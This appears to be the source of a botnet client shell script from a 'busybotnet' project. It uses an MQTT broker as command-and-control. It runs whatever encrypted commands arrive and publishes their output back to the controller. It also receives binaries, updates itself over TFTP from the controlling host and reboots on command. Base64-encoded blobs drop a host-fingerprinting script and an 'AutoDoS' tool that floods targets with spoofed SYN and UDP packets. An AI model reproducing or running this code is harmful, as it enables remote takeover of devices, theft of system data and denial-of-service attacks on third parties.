
# message queing telemetry transport shell
# https://github.com/isdrupter/busybotnet
pipe=p
binDest=/tmp/bin
ip=`/sbin/ifconfig lo | grep Mask | cut -d ':' -f2 | cut -d " " -f1` # get a client id
#pidfile=/var/run/sub.pid
pidfile=sub.pid
workdir="/tmp/.mqsh"
if [ ! -d "$workdir" ]; then 
mkdir $workdir
fi



publish(){
host=$1;pass=$2;theout=$3
if ([[ $debug == "1" ]]);then echo publishing to $host;fi
cat $theout | pubclient -h $host -i ${ip} -q 2 -t data/${ip} -u bot -P $pass -s ;rm $theout
}

execute(){
#echo $@ > _cmd_
uxt=`date +%s`
out=output.${uxt}
jsh $@ | fenc e ~/git/mqsh/key |base64 > $out
publish $host $pass $out &
if ([[ $debug == "1" ]]);then echo 'Executed command in thread';fi
}

spit(){
echo 'IyEvYmluL3NoCiNtYWtlIGEgY21kIGpzb24KYmJqPWBidXN5Ym94IGpzaG9uIC1zIDI+L2Rldi9udWxsIDE+L2Rldi9udWxsYAppcD0kYmJqIiQoL3NiaW4vaWZjb25maWcgZXRoMSB8IGdyZXAgTWFzayB8IGN1dCAtZCAnOicgLWYyIHwgY3V0IC1kICIgIiAtZjEpIgp1bml4dGltZT0kYmJqIiQoZGF0ZSArJXMpIgpkYXRlPSRiYmoiJChkYXRlKSIKdXB0aW1lPSRiYmoiJCh1cHRpbWUgfCBzZWQgcy9cLC8vKSIKa2VybmVsY21kbGluZT0kYmJqIiQoY2F0IC9wcm9jL2NtZGxpbmUpIgppZD0kYmJqIiQoaWQpIgprY3J5cHRvPSRiYmoiJChjYXQgL3Byb2MvY3J5cHRvIHwgZ3JlcCBuYW1lIHwgY3V0IC1kJzonIC1mMiB8IHVuaXEgfCB0ciAtcyAnXG4nICcgJ3xzZWQgcy9cLC8vKSIKdmVyc2lvbj0kYmJqIiQoY2F0IC9wcm9jL3ZlcnNpb24pIgptZW1zdGF0PSRiYmoiJChjYXQgL3Byb2MvbWVtaW5mbyB8IGhlYWQgLW4gMyB8IHRyIC1zICdcbicgJyAnKSIKY3dkPSRiYmoiJChwd2QpIgpzaGVsbD0kYmJqIiQoZWNobyAkU0hFTEwpIgpjbWRsaW5lPSRiYmoiJEAiCm91dHB1dD1gYnVzeWJveCBqc2hvbiAtcyAiJCgkQCkiYApnZXRzdHR5PSRiYmoiJChzdHR5KSIKdGVybT0kYmJqIiQoZWNobyAkVEVSTSkiCmNwdW5hbWU9JGJiaiIkKGNhdCAvcHJvYy9jcHVpbmZvIHwgZ3JlcCBuYW1lKSIKCmVjaG8gJ3sKImlwIiA6ICInJGlwJyIsCiJ1bml4dGltZSI6ICInJHVuaXh0aW1lJyIsCiJkYXRlIjogIickZGF0ZSciLAoidXB0aW1lIiA6ICInJHVwdGltZSciLAoiY3B1bmFtZSI6ICInJGNwdW5hbWUnIiwKIm1lbXN0YXQiIDogIickbWVtc3RhdCciLAoiaWQiIDogIickaWQnIiwKInZlcnNpb24iIDogIickdmVyc2lvbiciLAoia2VybmVsX2NtZGxpbmUiOiAiJyRrZXJuZWxjbWRsaW5lJyIsCiJrZXJuZWxfY3J5cHRvIjogIicka2NyeXB0byciLAoic2hlbGwiOiAiJyRzaGVsbCciLAoidGVybSI6ICInJHRlcm0nIiwKInN0dHkiOiAiJyRnZXRzdHR5JyIsCiJjd2QiOiAiJyRjd2QnIiwKImNtZGxpbmUiOiAiJyRjbWRsaW5lJyIsCiJvdXRwdXQiOiAnJG91dHB1dCcKfScKCgoK'|base64 -d >/var/bin/jsh
chmod +x /var/bin/jsh
echo 'IyEvdmFyL2Jpbi9hc2gKIyBBdXRvRG9TIC0gU2hlbGwgV3JhcHBlciB0byBTZW5kIE11bHRpcGxlIFNwb29mZWQgUGFja2V0cwojIFNoZWxselJ1cyAyMDE2CiMKCm1vZGU9JDEKaXA9JDIKcG9ydD0kezM6LSI4MCJ9CnRocmVhZHM9JHs0Oi0iNSJ9CnNlY3M9JHs1Oi0iMzAifQoKc3RhdGZpbGU9L3RtcC8uc3RhdHVzCgoKI1NFUSgpe2k9MDt3aGlsZSBbWyAiJGkiIC1sdCAxMCBdXTtkbyBlY2hvICRpOyBpPWBleHByICRpICsgMWA7ZG9uZX0KdXNhZ2UoKXsKZWNobyAiIFwKLSMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIy0KIEF1dG8tRG9zIFZlcnNpb24gMy4wCiAgVXNhZ2U6CiAgJDAgW3RhcmdldCBpcF1bcG9ydF1bdGhyZWFkc11bc2Vjc10KICBEZWZhdWx0OiA1IHRocmVhZHMvMzAgc2VjIE1heDogMjAgdGhyZWFkcy8zMDAgc2VjCi0jIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIy0iCn0KCmZpbmlzaCgpewogICAgaWYgW1sgLXMgIiRzdGF0ZmlsZSIgXV07dGhlbgogICAgID4kc3RhdGZpbGUKICAgIGZpCn0KCnRjcCgpewojZWNobyAiJHRoaXNib3QgOiIKcG9ydD0kezI6LSI4MCJ9CnRocmVhZHM9JHszOi0iNSJ9CnNlY3M9JHs0Oi0iMzAifQplY2hvICJIaXR0aW5nICRpcDokcG9ydCBGb3IgJHNlY3Mgc2VjcyB3aXRoICR0aHJlYWRzIHRocmVhZHMgbW9kZSB0Y3AiCnNzeW4yICRpcCAkcG9ydCAkdGhyZWFkcyAkc2VjcyA+L2Rldi9udWxsICYgZWNobyAiJCEiID4gJHN0YXRmaWxlCnNsZWVwICRzZWNzICYmIGZpbmlzaAp9CnVkcCgpewpwb3J0PSR7MjotIjgwIn0KdGhyZWFkcz0kezM6LSI1In0Kc2Vjcz0kezQ6LSIzMCJ9CiNlY2hvICIkdGhpc2JvdCA6IgplY2hvICJIaXR0aW5nICRpcDokcG9ydCBmb3IgJHNlY3Mgc2VjcyB3aXRoICR0aHJlYWRzIHRocmVhZHMgbW9kZSB1ZHAiCnN1ZHAgJGlwICRwb3J0IDEgJHRocmVhZHMgJHNlY3MgPi9kZXYvbnVsbCAmIGVjaG8gIiQhIiA+ICRzdGF0ZmlsZQpzbGVlcCAkc2VjcyAmJiBmaW5pc2gKfQoKa2lsbEl0KCl7CmtpbGwgLTkgYGNhdCAkc3RhdGZpbGVgOyhbICIkPyIgLWVxICIwIiBdKSAmJiBlY2hvICJLaWxsZWQiOz4kc3RhdGZpbGUKfQoKY2hlY2soKXsKCmlmIFtbICEgLWYgJHN0YXRmaWxlIF1dO3RoZW4gdG91Y2ggJHN0YXRmaWxlO2ZpCnN0YXQ9YGNhdCAkc3RhdGZpbGVgCiN0aGlzQm90PWAvc2Jpbi9pZmNvbmZpZyBldGgxIHwgZ3JlcCBNYXNrIHwgY3V0IC1kICc6JyAtZjIgfCBjdXQgLWQgIiAiIC1mMWAKaWYgKFtbICIkaXAiID09ICIiIF1dIHx8IFtbICIkcG9ydCIgPT0gIiIgXV0gfHwgW1sgIiR0aHJlYWRzIiAtZ3QgIjIwIiBdXSB8fCBbWyAiJHNlY3MiIC1ndCAiMzAwIiBdXSApCnRoZW4KdXNhZ2UKZXhpdCAxCmVsc2UgCmlmIFsgLXMgJHN0YXRmaWxlIF0gO3RoZW4KZWNobyBTeXN0ZW0gaXMgYnVzeS4gV2FpdCBhIG1pbnV0ZS4KZXhpdCAxCmZpCmZpCn0KCmNhc2UgJG1vZGUgaW4gLXR8LS10Y3ApCgpjaGVjawp0cmFwIGZpbmlzaCAxIDIgOAp0Y3AgJGlwICRwb3J0ICR0aHJlYWRzICRzZWNzCgo7OwotdXwtLXVkcCkKY2hlY2sKdHJhcCBmaW5pc2ggMSAyIDgKdWRwIGlwICRwb3J0ICR0aHJlYWRzICRzZWNzCgo7OwoKLWt8LS1raWxsKQpraWxsSXQKOzsKKikKZWNobyAiJDAgW21vZGVbLS10Y3AvLS11ZHBdXSBbaXBdIFtwb3J0XSBbdGhyZWFkXSBbc2Vjc10iCjs7CmVzYWMKCmV4aXQK'|base64 -d > /var/bin/dos
chmod +x /var/bin/dos
}

run(){
host=$1;pass=$2;path=$3;debug=$4
if ([[ $debug == "1" ]]); then 
echo Host: "$host";echo Pass : "$pass";echo Debug: "$debug";echo Path: "$path"
fi

if [ ! -p p ]; then mkfifo $pipe;fi
spit
subclient -h $host -q 2 -i ${ip} -t shell/bot -u bot -P $pass > $pipe & echo "$!" > $pidfile # Daemonize

while read line <$pipe
do
  echo "$line" |base64 -d|fenc d ~/git/mqsh/key > denc
    if grep -q '__quit__' denc; then # Quit if we receive _quit_
    if ([[ $debug == "1" ]]);then echo Received quit;fi
        rm $pipe enc denc output p;kill -9 `cat $pidfile`;rm $pidfile;reboot;break;exit
    elif grep -q '_binary_' denc;then
    if ([[ $debug == "1" ]]);then echo Received binary;fi
      sed '1d' denc > $binDest
      if [ $? -eq "0" ];then 
        echo 'Successfully transfered binary :' > output
        ls -l $binDest >> output
        publish $host $pass output;rm output
      else 
         echo 'Failed to write binary' > output
      fi
    elif grep -q '_info_' denc;then
        echo Host: "${ip}" > output 
        echo Uptime: `uptime` >> output
        free -m >> output
        netstat -taupen >> output
        publish $host $pass output;rm output
    elif grep -q '_update_' denc;then
        trap "" 1 2;(cd /var/bin;rm $0;tftp -g -r mq $host;kill `cat pidfile`;mqsh)
    else # otherwise execute whatever
      if ([[ $debug == "1" ]]);then echo Received a command, will exec...;fi
      cmd=`cat denc`
      execute $cmd
     fi
done
}




host=${1:-"127.0.0.1"}
pass=${2:-"pass"}
path=${3:-"$PATH"}
debug=${4:-"0"}

echo "MqSH Version 0.6-----------------------------------------------"
# Changes from 0.5: Now run commands in subshell as not to lock up the
# shell in a loop.
echo "Usage: [$0][[host]default:127.0.0.1]][[pass][default:password]]"
echo "             \ [[path][[default:/var/bin]][[debug][[default:0]]"
echo "Options:-------------------------------------------------------"



trap "" 1 2 8 #trap signals
export PATH=$path
if ([[ "$debug" == "1" ]]);then
  run $host $pass $path $debug
else
  (run $host $pass $path $debug) & 2>/dev/null # to detach, i think we need stder redirected
fi

